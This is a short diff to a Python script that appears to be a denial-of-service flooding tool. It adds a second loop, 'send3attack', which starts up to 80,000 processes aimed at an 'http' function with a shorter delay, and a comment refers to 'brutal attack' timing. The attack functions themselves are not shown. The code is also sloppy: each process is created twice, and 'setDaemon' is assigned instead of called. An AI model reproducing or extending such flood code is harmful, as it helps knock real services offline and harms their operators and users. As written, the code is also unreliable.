@@ -88,7 +88,8 @@ bar2.finish()
 
 def send4attack():
   for i in range(80000): 
-    mp = multiprocessing.Process(target=attack)
+    mp = multiprocessing.Process(target=http)
+    mp = multiprocessing.Process(target=http)
     mp.setDaemon = True
     mp.start() 
     sleep(2.0)
@@ -96,6 +97,18 @@ def send4attack():
     
     
 send4attack()
+
+def send3attack():
+  for i in range(80000): 
+    mp = multiprocessing.Process(target=http)
+    mp = multiprocessing.Process(target=http)
+    mp.setDaemon = True
+    mp.start() 
+    sleep(1.0)
+    
+    
+    
+send3attack()
 
 #time.sleep random package- sleep(0.1) in brutal attack
 exit(1)
